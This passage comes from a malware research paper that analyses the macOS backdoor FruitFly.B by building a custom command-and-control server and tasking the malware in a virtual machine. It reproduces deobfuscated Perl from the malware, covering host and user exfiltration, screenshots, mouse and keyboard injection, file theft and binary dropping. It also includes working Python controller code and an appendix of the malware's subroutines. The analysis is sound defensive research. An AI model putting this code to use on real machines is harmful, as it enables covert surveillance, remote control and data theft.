socket.SOCK_STREAM)\n#bind & listen\nsock.bind(('0.0.0.0', port))\nsock.listen(1)\n#wait for client to connect\nwhile True:\n   connection, client_address = sock.accept()\n   print 'client connected: ', client_address\n\n```\nListing 21: Socket code of the C&C server.\n\nLet's start the server and see if the malware connects:\n\nFigure 23: Listening for connections.\n\nIn a virtual machine, we execute the malware with address of our host machine\n(192.168.0.2) and the port the C&C server is listening on (1337):\n\nFigure 24: Connecting to the custom C&C server.\n\nBack to the C&C server:\n\n\n-----\n\nFigure 25: Connected to custom C&C server.\n\nHooray, we get a connection!\n\nDuring our brief initial triage of the malware, we noted that once the malware connects to a\nC&C server, before processing any tasking, it executes the code snippet shown in Listing 22.\n\nThe 'Y' and 'Z' subroutines format ('pack') data for network transmission, while the 'G'\nsubroutine sends such data to the C&C server.\n```\n#send client data to C&C\nG v1\n  . Y(1143)\n  . Y( $q ? 128 : 0 )\n  . Z( ( $z ? I('scutil --get LocalHostName') : '' ) || I('hostname') )\n  . Z( I('whoami') );\n\n```\nListing 22: Client data sent to C&C server.\n\nSummarizing the code snippet, the malware will send the following:\n\n**Direction** **Size** **Value**\n\nsend 1 byte 1\n\nsend 4 bytes 1143 (version #)\n\nsend 4 bytes 0, or 128\n\nsend variable host name\n\nsend variable user name\n\nTable 4: Format of client data.\n\nWith this information, we can extend our custom C&C server to both receive and format this\ndata:\n```\n#read data from malware\ndata = connection.recv(100)\noffset = 0\nprint 'offset 0x%02x: byte 0x%02x' % (offset, ord(data[offset]))\n\n```\n|Direction|Size|Value|\n|---|---|---|\n|send|1 byte|1|\n|send|4 bytes|1143 (version #)|\n|send|4 bytes|0, or 128|\n|send|variable|host name|\n|send|variable|user name|\n\n\n-----\n\n```\n...\n#read length\nlength = struct.unpack('I', data[offset:offset+4])[0]\noffset += 4\n#read/display user name ('whoami')\nprint 'offset 0x%02x: str (user name): %s' % (offset,\ndata[offset:offset+length])\n\n```\nListing 23: Parsing client data.\n\nNow, when the malware within our VM connects, the C&C server will output the following:\n\nFigure 26: Output of client data.\n\nOnce the malware has sent the initial client data, it expects a single byte – a numeric\ncommand from the C&C server.\n\nThe 25 or so commands supported by the malware range in value from 0 to 47. Our task is\nto understand the command‑specific protocol for each via a combination of static analysis\nand passive observations (e.g. a network sniffer to understand the format of the malware's\nresponse for a given command). This will allow us to task the malware, iterating through all\nits commands with the goal of understanding ultimately what each command does.\n\nIt is trivial to understand the purpose of some commands simply via static analysis. For\nothers, tasking the malware and then observing its actions will reveal the purpose of the\ncommand more efficiently.\n\nNow let's look at how to implement support for a basic command. We'll pick command #11,\nas the malware implements it in just a few lines of code:\n```\n#command #11\nelsif ( $D == 11 ) {\n  G v11 . Z( I('pwd') )\n}\n\n```\n\n-----\n\nListing 24: Command #11.\n\nClearly this command simply gets the path of the 'working directory' and sends it back to the\nC&C (prefixed with the command number, 11).\n\nTo add support for this command in our custom C&C server, we add the following:\n```\n#supported commands\nmenu = {\"11\":(\"Print Working Directory\",cmdPWD),}\n#display supported commands\nprint '\\navailable commands:'\nfor key in sorted(menu.keys()):\n  print key+\":\" + menu[key][0]\n#get command\ncommand = raw_input(\"\\nselect command: \")\n#execute command\nmenu.get(command,[None,invalid])[1](connection)\n#command #11\ndef cmdPWD(connection):\n  #send command\n  connection.sendall(struct.pack('b', 11))\n  #malware first responds w/ command #\n  data = connection.recv(1)\n  print 'byte 0x%02x (command)' % (ord(data))\n  #read & unpack length of pwd\n  data = connection.recv(4)\n  length = struct.unpack('I', data)[0]\n  #read pwd\n  data = connection.recv(length)\n  print 'working directory: %s' % data\n\n```\nListing 25: Command #11 support on C&C server.\n\nSo, does this work? That is to say, can we task the malware in order to confirm that\ncommand #11 returns the path to the malware's working directory?\n\nWith the C&C running, on the infected VM we first manually execute 'pwd' to determine the\nactual working directory. Then we execute the malware so it connects to our updated C&C\nserver, as shown in Figure 27.\n\n\n-----\n\nFigure 27: Infected host's 'pwd'.\n\nThe C&C accepts the connection and we task the malware to execute command #11:\n\nFigure 28: Tasking command #11 ('pwd').\n\nLooking good! In this case it was trivial to see (by looking at that malicious Perl script) that\ncommand #11 returned the working directory. That is to say, implementing support for this\ncommand server-side wasn't really necessary in order to understand what it did. However, it\nwas a good illustrative example and it did provide confirmation that our static analysis of\ncommand #11 was correct.\n\nIn the next section, we'll show that, via C&C tasking, other, far more complex commands can\nbe fully understood.\n\n## Command enumeration via C&C tasking\n\nIn this section, we'll iterate through the majority of the malware's more complex commands in\norder to reveal their purpose. Several of these commands call into the malware's embedded\nmachO executable in order to perform complex logic. Sure, we could spend hours reversing\nthis binary – or we could just task the malware to execute such commands and passively\nobserve what it does. Work smart not hard, right?\n\nIt should be noted that several of the commands that the malware supports are trivial to\nunderstand simply by reading the deobfuscated Perl script. For example, command #11, as\nwe just showed, simply invokes macOS's built-in 'pwd' command (/bin/pwd) and sends the\nresult back to the C&C server:\n\n\n-----\n\n```\n#command #11\nelsif ( $D == 11 ) {\n  G v11 . Z( I('pwd') )\n}\n\n```\nListing 26: Command #11.\n\nFor such simple commands, static analysis (i.e. reading the Perl script) does, of course,\nsuffice. One does not have to use monitoring utilities or even add support in the custom C&C\nserver.\n\nHowever, such utilities and/or C&C support are still useful, even for such simple commands.\nFor example, by passively observing the malware one can confirm, without a doubt, the\npurpose of such commands. Think of such utilities and C&C support as a way to double\ncheck, or confirm the assumptions you have made based solely on the static analysis of the\ncommands.\n\n_Note: for the sake of completeness, our custom C&C server supports all the malware's_\n_commands. However, due to space constraints such basic commands aren't discussed in_\n_this section (see_ _Appendix B for a full listing and summarization of all commands)._\n\nA few of the basic commands supported by the malware include:\n\n**Command #** **Description**\n\n4 Get host's uptime\n\n6 Evaluate a Perl statement\n\n11 Get malware's working directory via 'pwd'\n\n13 Get location of malware's script on disk\n\n19 Causes the malware to call exit() to quit\n\n20 Execute a command via system()\n\nTable 5: Basic commands.\n\nLet's now dive into the more complex commands, and illustrate how, via the custom C&C\nserver in conjunction with the monitoring utilities, we can trivially uncover their purpose.\n\n### Command #2\n\nCommand #2 contains logic to call into the malware's embedded machO binary, passing in\nthe command number (2) and another byte it reads from the C&C server:\n\n|Command #|Description|\n|---|---|\n|4|Get host's uptime|\n|6|Evaluate a Perl statement|\n|11|Get malware's working directory via 'pwd'|\n|13|Get location of malware's script on disk|\n|19|Causes the malware to call exit() to quit|\n|20|Execute a command via system()|\n\n\n-----\n\n```\n#command #2\n# ->exec binary, passing in '2' and extra byte from C&C\nelsif ( $D == 2 )\n{\n  #read another byte from C&C\n   my ( $Z, $C ) = ( J 1 );\n   if ( !$O\n     #save embedded binary & and exec w/ args\n     && V( v2 . $Z )\n     #read 4 bytes output\n     && defined( $C = E(4) )\n     #read variable length output\n     && defined( $C = E( unpack 'V', $C ) ) )\n   {\n     #send cmd (2) and variable length data to C&C\n   G v2 . Z($C);\n   }\n   ...\n\n```\nListing 27: Command #2.\n\nThough we don't know (yet) what the value should be for the command, we can still add\nsupport for it to our custom C&C server, as shown in Listing 28.\n```\n#command #2\ndef cmdTwo(connection):\n  data = ''\n  bytesReceived = 0\n  #send command\n  connection.sendall(struct.pack('b', 2))\n  #command expects another byte\n  param = raw_input(\"\\nenter param: \")\n  #send byte\n  connection.sendall(struct.pack('B', int(param)))\n  #malware first responds w/ command #\n  print 'byte 0x%02x' % (ord(connection.recv(1)))\n\n```\n\n-----\n\n```\n  #then, length of remaining data\n  length = struct.unpack('I', connection.recv(4))[0]\n  #read rest of response\n  while bytesReceived < length:\n    #get chunk\n    chunk = connection.recv(1024)\n    bytesReceived += len(chunk)\n    #append\n    data += chunk\n  #save data\n  with open('file_' + param, 'wb') as file:\n    file.write(data)\n\n```\nListing 28: C&C support for command #2.\n\nOnce the malware connects to our C&C server, we task it to execute command #2. For the\nsecond byte that command #2 expects, we initially send it a zero.\n\nOn the infected host, via the file monitor, we first observe the malware saving the embedded\nmachO binary to disk (as /tmp/client) and making it executable via chmod.\n\nFigure 29: Saving embedded binary to disk.\n\nNext, via our process monitor, we observe the malware executing this binary:\n\nFigure 30: Embedded binary execution.\n\nNote that the process monitor doesn't show any arguments. This is 'correct' as the malicious\nPerl script passes in any parameters not via the command-line, but instead by writing directly\nto /tmp/client's stdin:\n\n\n-----\n\n```\n#passing arguments via stdin\nsub V {\n  ...\n  $P = open2( $H, $Q, $b );\n  syswrite $Q, $_[0];\n}\n\n```\nListing 29: Writing a parameter to stdin.\n\nIf we disassemble the embedded machO binary we uncover the code that reads in the\nparameter from stdin (via getchar()). As the following disassembly shows, the binary uses\nthis value as an index into a table of function pointers. In order words, this value is a\n'command' selector.\n```\n#argument processing\n# ->reads from stdin & switches on value\ncall    getchar\ncmp    eax, 0xffffffff\nje     exit\ncmp    eax, 0x11\njbe     switch\njmp    exit\nswitch:\nlea     rdx, qword [sub_100001cc0+356]\nmovsxd rax, dword [rdx+rax*4]\nadd    rax, rdx\njmp    rax\n\n```\nListing 30: Argument processing in embedded binary.\n\nFinally, via the network monitor, we observe the malware sending a large chunk of data\n(200,000+ bytes) back to the C&C server.\n\nFigure 31: command #2's network traffic (from client).\n\n\n-----\n\nIn Figure 32, we can see the response written out to file on the C&C server. It looks like a\nPNG, and the 'file' command (/usr/bin/file) seems to agree (see Figure 33).\n\nFigure 32: Examining command #2's response.\n\nFigure 33: File type identification.\n\nOf course, seeing is believing, and Figure 34 shows the result.\n\nFigure 34: Command #2's result (parameter value: 0).\n\nAt this point it was clear that tasking the malware via command #2 would capture a\nscreenshot and upload it to the C&C server. However, we still didn't know the meaning of the\nsecond parameter.\n\n\n-----\n\nFrom the C&C server, we instructed the malware to execute command #2 multiple times,\neach time passing in a different value for the second parameter (1, 2...15, 16, 32, 128, 255,\netc.).\n\nTable 6 summarizes the results.\n\n**Parameter** **Size** **Type** **Colour** **Resolution**\n\n0 1.4KB PNG colour high\n\n1 64KB PNG black & white low\n\n8 788KB PNG black & white high\n\n9 1.4KB PNG colour high\n\n10 60KB JPEG colour low\n\n64 168KB JPEG colour medium\n\n110 1.2MB JPEG colour high\n\n111+ 1.4MB PNG colour high\n\nTable 6: Command #2 parameter values/results.\n\nFigure 35: Command #2's result (parameter value: 1).\n\n|Parameter|Size|Type|Colour|Resolution|\n|---|---|---|---|---|\n|0|1.4KB|PNG|colour|high|\n|1|64KB|PNG|black & white|low|\n|8|788KB|PNG|black & white|high|\n|9|1.4KB|PNG|colour|high|\n|10|60KB|JPEG|colour|low|\n|64|168KB|JPEG|colour|medium|\n|110|1.2MB|JPEG|colour|high|\n|111+|1.4MB|PNG|colour|high|\n\n\n-----\n\nFigure 36: Command #2's result (parameter value: 10).\n\nFrom this 'observational analysis' it's easy to see that the second parameter controls the\nformat (PNG/JPEG), colour depth, and resolution of the image.\n\n### Command #8\n\nCommand #8 also causes the malware to call into the embedded machO binary. This\ncommand takes three additional command-specific parameters from the C&C server. Triage\nshowed these to be a single byte followed by two four-byte integer values. However, the\npurpose of the command and these parameters, at this point, remained unknown.\n```\n#command 8\nelsif ( $D == 8 )\n{\n  #read 9 additional bytes from C&C server\n  my ( $Z, $C ) = ( J 9 );\n  #exec embedding binary, passing in 9 bytes\n  if ( V( v8 . $Z ) && defined( $C = E(1) ) )\n  {\n    #respond to server\n    G( ord($C) ? v8 : v0.10 );\n  }\n}\n\n```\n\n-----\n\nListing 31: Command #8.\n\nThe data returned by this command is either the command number (8) or a zero, depending\non whether the command succeeds or fails. Thus, unlike command #2 which revealed its\npurpose by the data it returned (i.e. a screenshot), the purpose of command #8 was not\nimmediately apparent.\n\nTime to turn to our monitoring utilities that were running on the infected system.\n\nOnce the malware had connected to our custom C&C server, we sent it command #8,\nfollowed by three values (a byte and two four-byte integers).\n\nThe file and process monitors showed the embedded machO binary being saved to disk\n(/tmp/client) and executed by the malicious Perl script – but then nothing else. Interestingly,\nthe mouse sniffer lit up.\n\nFor example, passing in 0, 0, 0 for the three command-specific parameters generated the\nfollowing mouse event:\n\nFigure 37: Captured mouse event (parameter values: 0,0,0).\n\nFigure 38: Captured mouse event (parameter values: 0,123,456).\n\nYes, the mouse did move!\n\nSo tasking the malware via command #8, and then specifying zero, moves the mouse to the\nx,y screen location provided by the two remaining parameters.\n\nIf we pass a 1, (instead of a 0), and again 123, 456 the mouse sniffer registers the following:\n\n\n-----\n\nFigure 39: Captured mouse event (parameter values: 1,123,456).\n\nIt is easy to see that the 1 parameter instructs the malware, via the mouse command (#8), to\nmove and then left-click the mouse. Passing in a 2 seems to generate the same event (left\nmouse click).\n\nTasking the mouse command with a 3 generates the following:\n\nFigure 40: Captured mouse event (parameter values: 3,123,456).\n\nAgain a move, but this time followed by a double left click.\n\nThe mouse events generated by values 4–7 are shown in Figures 41 to 44.\n\nFigure 41: Captured mouse event (parameter values: 4,123,456).\n\nFigure 42: Captured mouse event (parameter values: 5,123,456).\n\n\n-----\n\nFigure 43: Captured mouse event (parameter values: 6,123,456).\n\nFigure 44: Captured mouse event (parameter values: 7,123,456).\n\nTable 7 summarizes command #8's 'subcommand' values:\n\n**Subcommand** **Description**\n\n0 Move mouse\n\n1 Left click (up & down)\n\n2 Left click (up & down)\n\n3 Left double click\n\n4 Left click (down)\n\n5 Left click (up)\n\n6 Right click (down)\n\n7 Right click (up)\n\nTable 7: Command #8 'subcommand' values.\n\nIt should be noted that, when tasked with command #8:\n\n   - the mouse is always first moved to the specified x, y coordinates before the action\n(left click, etc.) is generated\n\n   - if a mouse 'down' event is sent (e.g. #4), and then a move mouse 'move' event is sent\n(e.g. #0), this will generate a mouse 'dragged' event:\n\n|Subcommand|Description|\n|---|---|\n|0|Move mouse|\n|1|Left click (up & down)|\n|2|Left click (up & down)|\n|3|Left double click|\n|4|Left click (down)|\n|5|Left click (up)|\n|6|Right click (down)|\n|7|Right click (up)|\n\n\n-----\n\nFigure 45: Captured mouse event (drag).\n\nThis allows the malware to perform actions such as selecting text:\n\nFigure 46: Selected text via\n\ncommand #8.\n\nLet's now take a look at command #12. As with the other more complex commands, this\ncommand expects the C&C server to send some command-specific data. Specifically, it\nexpects a single byte followed by a variable length string:\n```\n#command 12\nelsif ( $D == 12 ) {\n  #read one byte\n   my $Z = ord J 1;\n  #read variable length string\n   my ( $S, $p ) = ( H, '' );\n  #sub-command 0\n   if ( $Z == 0 ) { $p = K( -e $S ) }\n  ...\n  #sub-command 4\n   elsif ( $Z == 4 ) { $p = Y( -s $S ) }\n  ...\n  #respond\n   G v12 . chr($Z) . Z($S) . $p;\n}\n\n```\n\n-----\n\nListing 32: Command #12.\n\nTo determine the purpose of this command, we can simply task the malware to execute it\nonce it reconnects, by sending it a 12.\n\nWe start by specifying a 0 for the first byte the command expects and then the string 'foo'.\nClosely watching our monitoring utilities we notice this triggers an event on just one, the file\nmonitor:\n\nFigure 47: Command #12 file I/O (parameter value: 0).\n\nThe malware responds to the C&C server with a zero.\n\nFigure 48: Command #12 response to C&C server.\n\nSince (via the file monitor) we observed the malware performing a 'stat64' on the string\npassed from the C&C server ('foo'), it seems reasonable to assume that perhaps the\ncommand was attempting to check for the presence of a file.\n\nIf we re-task the malware with the same command and initial parameter (0), but this time\nprovide a path to a file that exists on the infected system, again we see the stat64, but this\ntime the malware responds with a 1, as can be seen in Figure 49.\n\n\n-----\n\nFigure 49: Command #12 response to C&C server.\n\nThus we can conclude that command #12, when passed an initial parameter ('subcommand')\nof 0, will check for the existence of a file and return a boolean value representing the result of\nthis check.\n\nWhat about the other 'subcommands' of command #12? Let's send them and observe what\nhappens.\n\nIf we send the malware a 12 to execute the file command, followed by a 1, and then a path to\na file, the file monitor shows the file being deleted via an unlink:\n\nFigure 50: Command #12 file I/O (parameter value: 1).\n\nSo, subcommand #1 deletes a file.\n\nWe performed the same tasking, with different subcommands (2, 3, ... 9):\n\nSubcommand #2 (file rename):\n\nFigure 51: Command #12 file I/O (parameter value: 2).\n\nSubcommand #3 (copy a file):\n\n\n-----\n\nFigure 52: Command #12 file I/O (parameter value: 3).\n\nSubcommand #4 (size of a file):\n\nFigure 53: Command #12 file I/O (parameter value: 4).\n\nFigure 54: Command #12 (parameter value: 4) response to C&C server.\n\nSubcommand #6 (read a file):\n\nFigure 55: Command #12 file I/O (parameter value: 6).\n\n\n-----\n\nFigure 56: Command #12 (parameter value: 6) response to C&C server.\n\nSubcommand #7 (write to file):\n\nFigure 57: Command #12 file I/O (parameter value: 7).\n\nSubcommand #8 (list file attributes (ls -a)):\n\nFigure 58: Command #12 process event (parameter value: 8).\n\nSubcommand #9 (list file attributes (ls -al)):\n\nFigure 59: Command #12 process event (parameter value: 9).\n\n\n-----\n\nFigure 60: Command #12 file I/O (parameter value: 9).\n\nTable 8 summarizes command #12's 'subcommand' values.\n\n**Subcommand** **Description**\n\n0 Does file exist?\n\n1 Delete file\n\n2 Rename (move) file\n\n3 Copy file\n\n4 Size of file\n\n5 Not implemented\n\n6 Read & exfiltrate file\n\n7 Write file\n\n8 File attributes (ls -a)\n\n9 File attributes (ls -al)\n\nTable 8: Command #12 ‘subcommand’ values.\n\nNext up are commands #16 and #17. These command expect to receive an extra byte (a\nsubcommand?) from the C&C server. This value, along with the command value (16 or 17),\nis passed into the 'V' subroutine.\n```\n#command 16 / 17\nelsif ( $D == 16 || $D == 17 )\n{\n  #read extra byte\n my $Z = J 1;\n  G(v0.23)\n\n```\n|Subcommand|Description|\n|---|---|\n|0|Does file exist?|\n|1|Delete file|\n|2|Rename (move) file|\n|3|Copy file|\n|4|Size of file|\n|5|Not implemented|\n|6|Read & exfiltrate file|\n|7|Write file|\n|8|File attributes (ls -a)|\n|9|File attributes (ls -al)|\n\n\n-----\n\n```\n   #exec embedded binary\n   # ->pass in command # and parameter\n   if !V( chr($D) . $Z );\n}\n\n```\nListing 33: Command #16/#17.\n\nRecall that the 'V' subroutine drops and executes the malware's embedded machO binary\nexecutable, passing it any parameters from the C&C server.\n\nVia our monitoring utilities we can see that, when the malware is tasked to execute either\ncommand #16 or command #17, the following events are recorded:\n\nFile monitor: the embedded binary is saved to disk (/tmp/client)\nProcess monitor: this binary, /tmp/client, is executed\nMouse/keyboard sniffer: keyboard events\n\nFor command #16, the keyboard event is a 'key down' event (kCGEventKeyDown):\n\nFigure 61: Captured keyboard event (kCGEventKeyDown).\n\nCommand #17, results in a keyboard 'key up' event (kCGEventKeyUp):\n\nFigure 62: Captured keyboard event (kCGEventKeyDown).\n\nNeat! So commands #16 and #17 can be used to send key presses to the active (forefront)\nwindow. In other words the malware affords an attacker the ability to type remotely on an\ninfected host. From an attacker's point of view, this capability may be useful to interact with\nsystem dialogs or other UI components on the infected system. Of course, the attacker could\nalso say 'hi' to the infected user:\n\n\n-----\n\nFigure 63: Captured keyboard events ('hi').\n\n'typing' via commands #16 & #17.\n\n\nFigure 64: Remote\n\n\nThe final command we'll look at in this section is command #47. On looking at this\ncommand's implementation in malicious Perl script, it appears to create a new socket\nconnection using various parameters from the C&C server:\n```\n#command 47\nelsif ( $D == 47 )\n{\n   my ( $A, $a, $F ) = ( 0, N, O );\n  $a = 'localhost' if !length $a;\n  my $C = new IO::Socket::INET(\n    PeerAddr => $a,\n    PeerPort => $F,\n    Proto => 'tcp',\n    Timeout => 2\n  );\n  if ( !$C ) {\n    $A = {\n       'Operation now in progress' => 10060,\n       'Connection refused' => 10061\n    }->{$!}\n    || 1;\n  }\n  else { close $C }\n  G v47 . Z($a) . Y($F) . Y($A);\n}\n\n```\nListing 34: Command #47.\n\n\n-----\n\nHowever, by using the monitoring utilities (specifically network-related ones) and C&C\ntasking, we can easily confirm the command's purpose and also easily figure out how the\nparameters from the C&C are used, as shown in Figure 65.\n\nFigure 65: C&C tasking command #47 ... and the malware's response.\n\nVia tcpdump we can observe the malware responding to our request to connect to the host\nspecified (virusbulletin.com, port 80), as shown in Figure 66.\n\n\n-----\n\nFigure 66: Malware's response to our request.\n\nFrom the network captures and response sent to the C&C we can confirm that command #47\nwill cause the malware to attempt a TCP connection to the host/port specified by the C&C\nserver. It will respond to the C&C server with a 0 if it can connect to host on the specified\nport, otherwise it will send back a 1.\n\nSomewhat interestingly, the malware will immediately close the connection even if it's\nsuccessful. Thus it appears this command was designed to check if a host is up, or if a\nspecific port on a host is open (versus establishing, say, a secondary communications\nchannel, perhaps to back up the C&C server).\n\n## Conclusion\n\nMalware analysis is a time-consuming and often strenuous process. And while traditional\nanalysis techniques such as static analysis and debugging can reveal the full functionality of\na malware specimen, there may be a better way.\n\nIn this research paper, we fully analysed an interesting piece of macOS malware by creating\nour own custom command‑and-control (C&C) server. In conjunction with various monitoring\nutilities, via this server we were able simply to task the malware in order to coerce it into\nrevealing its entire capabilities.\n\n\n-----\n\nBesides basic capabilities such as executing commands via system() and interacting with\nfiles on an infected system, we uncovered the fact that the malware supports more advanced\ncommands rarely (if ever?) seen in macOS malware. For example, being able to simulate\nmouse and keyboard events, perhaps to interact with system dialogs or alerts from security\nproducts, truly gives a remote attacker unprecedented control over an infected Mac.\n\n## References\n\n[1] New Mac backdoor using antiquated code. https://blog.malwarebytes.com/threatanalysis/2017/01/new-mac-backdoor-using-antiquated-code/.\n\n[2] VirusTotal. [https://www.virustotal.com/.](https://www.virustotal.com/)\n\n[3] BlockBlock. [https://objective-see.com/products/blockblock.html.](https://objective-see.com/products/blockblock.html)\n\n[4] Creating Launch Daemons and Agents.\nhttps://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemSt\nartup/Chapters/CreatingLaunchdJobs.html.\n\n[5] Methods of malware persistence on Mac OS X.\n[https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf.](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)\n\n[6] Perl Beautify. [http://www.cleancss.com/perl-beautify/.](http://www.cleancss.com/perl-beautify/)\n\n[7] How can I detect the operating system in Perl?.\n[https://stackoverflow.com/questions/334686/how-can-i-detect-the-operating-system-in-perl.](https://stackoverflow.com/questions/334686/how-can-i-detect-the-operating-system-in-perl)\n\n[8] Two Bugs, One Func(), part ii: a kernel info leak 0day, thanks to Apple's fix.\n[https://objective-see.com/blog/blog_0x1B.html.](https://objective-see.com/blog/blog_0x1B.html)\n\n[9] Two Bugs, One Func(), part iii: a kernel heap overflow.\n[https://objectivesee.com/blog/blog_0x1C.html.](https://objectivesee.com/blog/blog_0x1C.html)\n\n[10] OS X Internals: A Systems Approach. [http://www.osxbook.com/.](http://www.osxbook.com/)\n\n[11] CGEventTapCreate. https://developer.apple.com/documentation/coregraphics/1454426cgeventtapcreate.\n\n[12] Perl's pack function. [http://perldoc.perl.org/functions/pack.html.](https://perldoc.perl.org/functions/pack.html)\n\n## Appendix A\n\n### OSX/FruitFly.B Perl script, subroutines\n\n**Subcommand B**\n\n\n-----\n\n**› code**\n```\nsub B {\npack 'V2', $_[0] / 2**32, $_[0] % 2**32\n}\n\n```\n**› input**\n\nFour-byte host-byte integer (passed in $_[0]).\n\n**› output**\n\nTwo strings that represent the passed in integer a) divided by 2^32, and b) modded (%) by\n2^32.\n\n**› description**\n\nConverts a four-byte host-byte integer (passed in $_[0]) into to two strings to send to the\nC&C server. The first integer is divided by 2^32, while the second is modded (%) by 2^32.\n\n**Subcommand E**\n\n**› code**\n```\nsub E {\n  return undef if !$P;\n  my ( $U, $A ) = ( '', '' );\n  while ( $_[0] > length $U ) {\n    return R() if !sysread $H, $A, $_[0] - length $U;\n    $U .= $A;\n  }\n  return $U;\n}\n\n```\n**› input**\n\nNumber of bytes to read.\n\n**› output**\n\nBytes read.\n\n**› description**\n\nReads a specified number of bytes from a process, returning them to the caller. More\nspecifically, in a loop reads a specific number of bytes (passed in via $_[0]) from the stdout\nhandle ('$H') of process '$P'.\n\n\n-----\n\n**Subcommand G**\n\n**› code**\n```\nsub G {\n  die if !defined syswrite $l, $_[0]\n}\n\n```\n**› input**\n\nBytes to send to C&C server.\n\n**› output**\n\nNone.\n\n**› description**\n\nSends data to the command-and-control server. More specifically, writes whatever is passed\ninto the subroutine ($_[0]) to '$l', the socket that is associated with the C&C server.\n\n**Subcommand H**\n\n**› code**\n```\nsub H {\n  my $U = N;\n  $U =~ s/\\\\/\\//g;\n  $U\n}\n\n```\n**› input**\n\nNone.\n\n**› output**\n\nVariable length data from the C&C server (with '\\' -> '/').\n\n**› description**\n\nReads a chunk of variable length data via the 'N' subroutine, then replaces all occurrences of\n'\\' with '/' before returning it to the caller.\n\n**Subcommand I**\n\n**› code**\n\n\n-----\n\n```\nsub I {\n  my $U = eval { my $C = '$_[0]'; chomp $C; $C };\n  $U = '' if !defined $U;\n  $U;\n}\n\n```\n**› input**\n\nThe command to execute.\n\n**› output**\n\nResult (output) of executed command.\n\n**› description**\n\nExecutes a passed in command ($_[0]), chomps it, then returns the output.\n\n**Subcommand J**\n\n**› code**\n```\nsub J {\n  my ( $U, $A ) = ( '', '' );\n  while ( $_[0] > length $U ) {\n   die\n     if !sysread $l, $A, $_[0] - length $U;\n   $U .= $A;\n  }\n  return $U;\n}\n\n```\n**› input**\n\nNumber of bytes to read.\n\n**› output**\n\nData from the C&C server.\n\n**› description**\n\nReads data from the command-and-control server. This subroutine takes as input ($_[0]) a\nnumber of bytes to read. Then in a loop it reads data off the C&C socket ('$l'), accumulating it\ninto a buffer ('$U'). Once this buffer's size is equal to the requested number of bytes to read,\nthe loop exits and the bytes are returned to the caller.\n\n**Subcommand K**\n\n**› code**\n\n\n-----\n\n```\nsub K {\n  $_[0] ? v1 : v0\n}\n\n```\n**› input**\n\nValue to check.\n\n**› output**\n\n1 or 0.\n\n**› description**\n\nChecks if a passed in variable ($_[0]) is true (exists, is defined, etc.), returning a 1 or 0.\n\n**Subcommand M**\n\n**› code**\n```\nsub M {\n  $_[0] ^ ( v3 x length( $_[0] ) )\n}\n\n```\n**› input**\n\nEncoded string.\n\n**› output**\n\nDecoded string.\n\n**› description**\n\nGiven a string passed into the subroutine ($_[0]), XORs it with 3, returning the result.\n\n**Subcommand N**\n\n**› code**\n```\nsub N {\n  J\n  O\n}\n\n```\n**› input**\n\nNone.\n\n**› output**\n\n\n-----\n\nVariable length data from the C&C server.\n\n**› description**\n\nFirst invokes the 'O' subroutine, which returns a four-byte integer, read from the C&C server.\nThis is then passed as a parameter to the 'J' method, which reads that number of bytes from\nthe C&C server. In other words, this subroutine is invoked to read a chunk of variable-length\ndata (such as a string), with a prefixed length.\n\n**Subcommand O**\n\n**› code**\n```\nsub O {\n  unpack 'V', J 4\n}\n\n```\n› input\n\nNone.\n\n› output\n\nA four-byte string from the C&C server.\n\n› description\n\nInvokes the 'J' subroutine to read four bytes from the C&C socket, then 'unpacks' and returns\nit to the caller. Perl documents state that the 'V' format specifier represents 'an unsigned long\n(32-bit) in \"VAX\" (little-endian) order' [12]. Thus in this subroutine, the 'unpack' will convert a\nstring from the server into a host-byte integer.\n\n**Subcommand R**\n\n**› code**\n```\nsub R {\n  if ($P) {\n   close $H;\n   close $Q;\n   waitpid $P, 0;\n  }\n  $P = 0;\n  return undef;\n}\n\n```\n**› input**\n\nNone.\n\n\n-----\n\n**› output**\n\nNone (undef).\n\n**› description**\n\nIf a PID ('$P') of a previously executed process ('$b') isn't 0, closes the input and output\nhandles ('$H' and '$Q'), then waits for the process itself to exit.\n\n**Subcommand S**\n\n**› code**\n```\nsub S {\n  open F, '>', $_[0] or return undef;\n  binmode F;\n  print F $_[1] or return undef;\n  close F;\n  return 1;\n}\n\n```\n**› input**\n\nFirst argument: path of the file to write to.\n\nSecond argument: bytes to write.\n\n**› output**\n\n1.\n\n**› description**\n\nOpens the file passed in as an argument to subroutine ($_[0]) in binary mode for writing.\nThen writes out the bytes which are passed in (via the second argument, $_[1]).\n\n**Subcommand V**\n\n**› code**\n\n\n-----\n\n```\nsub V {\n  alarm 30;\n  if ( !$P ) {\n    alarm 120;\n    return undef if !$u || !S( $M, $u );\n    chmod 0777, $M;\n    $P = open2( $H, $Q, $b );\n    if ( !$O ) { sleep 1; unlink $M }\n  }\n  return undef if !$P;\n  return 1 if defined syswrite $Q, $_[0];\n  return R();\n}\n\n```\n**› input**\n\nParameter to pass to embedded machO binary.\n\n**› output**\n\n1, or undefined.\n\n**› description**\n\nBy means of various helper functions, writes out an embedded machO binary, executes it,\nand writes a passed in argument to the process's stdin.\n\nMore specifically, calls method 'S' with a reference to a variable ('$u') that has been set to a\nstream data that begins at a '__DATA__' This contains an encoded machO binary, which is\nwritten out to /tmp/client ('$M'). After making this binary executable via a call to chmod, the\nsubroutine forks a child process via a call to 'open2', to execute the command '$b'. Note that\n'$H' and '$Q' are passed in as variables to receive the process's stdout and stdin file\nhandles.\n\nAfter writing the passed in parameter to the new process's stdin ('$Q'), the subroutine\nreturns.\n\n**Subcommand W**\n\n**› code**\n```\nsub W {\n  open F, '<', $_[0] or return undef;\n  binmode F;\n  my $U = join '', <F>;\n  close F;\n  return $U;\n}\n\n```\n**› input**\n\n\n-----\n\nPath of file to reading.\n\n**› output**\n\nBytes in file.\n\n**› description**\n\nOpens the file passed in as an argument to subroutine ($_[0]) in binary mode for reading.\nThen reads in all bytes, returning them to the caller.\n\n**Subcommand Y**\n\n**› code**\n```\nsub Y {\n  pack 'V', $_[0]\n}\n\n```\n**› input**\n\nA four-byte integer.\n\n**› output**\n\nA four-byte string.\n\n**› description**\n\nConverts a four-byte host-byte integer (passed in $_[0]) into to string to send to the C&C\nserver.\n\n**Subcommand Z**\n\n**› code**\n```\nsub Z {\n  pack 'V/a*', $_[0]\n}\n\n```\n**› input**\n\nA string.\n\n**› output**\n\nA string, prefixed with its size.\n\n**› description**\n\n\n-----\n\nConverts a string into a string that s prefixed with its size. Such strings are then sent to the\nC&C server. According to Perl documentation [12], the 'V' packing template specifies 'an\nunsigned long (32-bit) in \"VAX\" (little-endian) order', while the 